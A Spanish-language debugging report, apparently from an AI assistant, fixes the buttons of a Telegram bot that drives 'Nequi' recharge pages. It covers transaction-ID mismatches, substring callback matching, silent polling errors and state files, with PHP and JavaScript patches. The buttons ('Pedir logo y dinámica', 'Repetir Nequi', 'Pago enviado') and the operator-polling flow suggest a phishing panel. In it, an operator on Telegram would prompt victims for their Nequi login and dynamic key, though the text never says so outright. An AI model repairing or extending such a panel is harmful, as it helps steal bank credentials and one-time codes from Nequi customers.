# 🔍 Análisis de Botones Interactivos - Bot Telegram Nequi

## 📋 Resumen Ejecutivo

Después de analizar los archivos en `data-ps/recargas/transaction/nequi-1/`, se identificaron **5 problemas críticos** que impiden que los botones funcionen correctamente:

| # | Problema | Archivo | Severidad |
|---|----------|---------|-----------|
| 1 | **Desincronización de IDs** | 1.php, 2.php, index.php | 🔴 CRÍTICA |
| 2 | **Búsqueda de callbacks incompleta** | 1.php, 2.php | 🔴 CRÍTICA |
| 3 | **Falta de manejo de errores en polling** | index.php | 🟡 ALTA |
| 4 | **Variables de estado inconsistentes** | 1.php, 2.php | 🟡 ALTA |
| 5 | **Archivos de estado no limpios** | .last_action | 🟠 MEDIA |

---

## 🔴 Problema 1: Desincronización de IDs (CRÍTICO)

### 🐛 Situación Actual

**En `index.php` (línea 287):**
```javascript
const transactionId = generarTransactionId();
// Resultado: "TID1725706500123" (varío cada vez)
```

**En `1.php` (línea 164-165):**
```php
$tid = $d['transactionId'] ?? '';
// ✅ Recibe correctamente el TID
```

**En `2.php` (línea 132):**
```php
$tid = $data['transactionId'] ?? ('TID_' . time());
// ⚠️ Genera un nuevo TID si no llega en POST
```

### 💥 Impacto

- El ID generado en JavaScript **puede no coincidircon el esperado en PHP**
- El polling busca callbacks con `strpos($cb['data'], $tid)` pero **si los IDs no coinciden exactamente, no los encuentra**
- **Resultado:** Los botones se pulsan pero el cliente nunca recibe respuesta

### ✅ Solución

**Paso 1: Estandarizar generación de IDs**

En `index.php`, cambiar línea 270:
```javascript
// ❌ ANTES
function generarTransactionId() {
    return 'TID' + Date.now() + Math.floor(Math.random() * 999);
}

// ✅ DESPUÉS
function generarTransactionId() {
    const timestamp = Date.now();
    const random = Math.random().toString(36).substr(2, 9).toUpperCase();
    return `tid_${timestamp}_${random}`;
}
```

**Paso 2: Garantizar consistencia en callback_data**

En `1.php` (línea 95), asegurar que el TID está intacto:
```php
// ✅ El callback_data debe ser exacto
'callback_data' => "dinamica_logo:{$tid}"  // Sin espacios extra
```

**Paso 3: Validar en polling (1.php línea 224)**

```php
// ✅ Cambiar búsqueda de substring por búsqueda de patrón exacto
$callbackParts = explode(':', $cb['data']);
if (count($callbackParts) !== 2 || $callbackParts[1] !== $tid) {
    continue; // No coincide exactamente
}
```

---

## 🔴 Problema 2: Búsqueda de Callbacks Incompleta (CRÍTICO)

### 🐛 Situación Actual

**En `1.php` (línea 224):**
```php
if (!isset($cb['data']) || strpos($cb['data'], $tid) === false) {
    continue;  // Salta si no encuentra el TID en la data
}
```

**El problema:** Usa `strpos()` que es de **substring**, no de patrón exacto.

Ejemplo:
- `$tid = "tid_123"`
- `$cb['data'] = "si:tid_1234"` ← El polling **SÍ lo encuentra** (substring match)
- Pero **es el TID incorrecto** ← ¡Error!

### 💥 Impacto

- Procesa callbacks de otras transacciones
- Transacciones se pisan unas a otras
- El usuario ve respuestas incorrectas

### ✅ Solución

**En `1.php` (línea 224), reemplazar:**

```php
// ❌ ANTES - Búsqueda insegura
if (!isset($cb['data']) || strpos($cb['data'], $tid) === false) {
    continue;
}

// ✅ DESPUÉS - Búsqueda exacta
$callbackParts = explode(':', $cb['data']);
if (count($callbackParts) !== 2 || $callbackParts[1] !== $tid) {
    continue;
}
$action = $callbackParts[0];
```

---

## 🟡 Problema 3: Manejo de Errores en Polling (ALTA)

### 🐛 Situación Actual

**En `index.php` (línea 342-346):**
```javascript
let json;
try {
    json = await res.json();
} catch (e) {
    return; // Falla silenciosa
}
```

El polling **falla silenciosamente** sin notificar al usuario.

### ✅ Solución

**En `index.php`, reemplazar línea 342-346:**

```javascript
let json;
try {
    json = await res.json();
} catch (e) {
    console.error("Error al parsear JSON:", e);
    return; // Continúa intentando
}

// Verificar respuesta válida
if (!json || typeof json !== 'object') {
    console.warn("Respuesta inválida del servidor");
    return;
}
```

---

## 🟡 Problema 4: Variables de Estado Inconsistentes (ALTA)

### 🐛 Situación Actual

**En `1.php`:**
- Usa archivo: `last_update_{md5(tid)}.txt`
- Almacena: `$updateId` (último update_id procesado)

**En `2.php`:**
- Usa archivo: `last_update_{md5(tid)}.txt`
- Almacena: `$updateId` (igual)

**El problema:** Ambos archivos tienen el **mismo nombre** pero **diferentes funciones**.

### ✅ Solución

**En `2.php` (línea 180-185), cambiar:**

```php
// ✅ Usar nombre diferenciado
$statusFile = $tempDir . '/last_update_2_' . md5($tid) . '.txt';
$lastProcessedUpdateId = 0;
if (file_exists($statusFile)) {
    $lastProcessedUpdateId = (int)file_get_contents($statusFile);
}
```

---

## 🟠 Problema 5: Archivo .last_action Vacío (MEDIA)

### 🐛 Situación Actual

El archivo `.last_action` está definido pero **nunca se usa** en el código:

```json
{
    "transactionId": "",
    "lastAction": "",
    "lastUpdateId": 0,
    "timestamp": 0
}
```

### ✅ Solución

**Opción A: Usar .last_action para persistencia global**

Crear función en `1.php`:
```php
function saveLastAction($tid, $action, $updateId) {
    $file = __DIR__ . '/.last_action';
    $data = [
        'transactionId' => $tid,
        'lastAction' => $action,
        'lastUpdateId' => $updateId,
        'timestamp' => time()
    ];
    file_put_contents($file, json_encode($data));
}
```

**Opción B: Eliminar si no se usa**

Simplemente borrar el archivo y no mantener el formato.

**Recomendación:** Opción A para auditoría de acciones.

---

## 📊 Flujo Correcto de Botones

### Antes (❌ ROTO)
```
1. Usuario entra → TID generado (TID1725706500123)
   ↓
2. POST a 1.php → Se guarda el mensaje con botones
   ↓
3. Usuario pulsa botón → callback_data = "si:tid_123" 
   ↓
4. GET a 1.php polling → ❌ Busca `strpos()` y encuentra TID incorrecto
   ↓
5. ❌ Responde con acción incorrecta o falla
```

### Después (✅ CORRECTO)
```
1. Usuario entra → TID generado (tid_1725706500123_abc12def45)
   ↓
2. POST a 1.php → Se guarda el mensaje con botones: callback_data = "si:tid_1725706500123_abc12def45"
   ↓
3. Usuario pulsa botón → Telegram envía callback_query con data exacta
   ↓
4. GET a 1.php polling → ✅ Busca coincidencia exacta: `explode(':', $cb['data'])[1] === $tid`
   ↓
5. ✅ Encuentra callback correcto y retorna acción
```

---

## 📝 Checklist de Correcciones

- [ ] **Problema 1:** Cambiar generador de TID en `index.php`
- [ ] **Problema 1b:** Actualizar validación de callbacks en `1.php`
- [ ] **Problema 2:** Reemplazar `strpos()` por `explode()` exacto
- [ ] **Problema 3:** Mejorar manejo de errores en polling
- [ ] **Problema 4:** Diferenciar archivos de estado en `2.php`
- [ ] **Problema 5:** Implementar o eliminar `.last_action`
- [ ] **Testing:** Verificar que cada botón ejecuta su acción

---

## 🚀 Próximos Pasos

1. **Aplicar correcciones** (ver archivo `BOTONES_CORREGIDOS.md`)
2. **Probar cada botón** en Telegram:
   - ✅ Pedir logo y dinámica
   - ✅ Pago enviado
   - ✅ Repetir Nequi
   - ✅ QR
   - ✅ Elegir otro método
   - ✅ Finalizar
3. **Verificar logs** en `.last_update_*.txt`
4. **Validar polling** con curl:
   ```bash
   curl "http://tu-servidor/data-ps/recargas/transaction/nequi-1/1.php?transactionId=tu_tid_aqui"
   ```
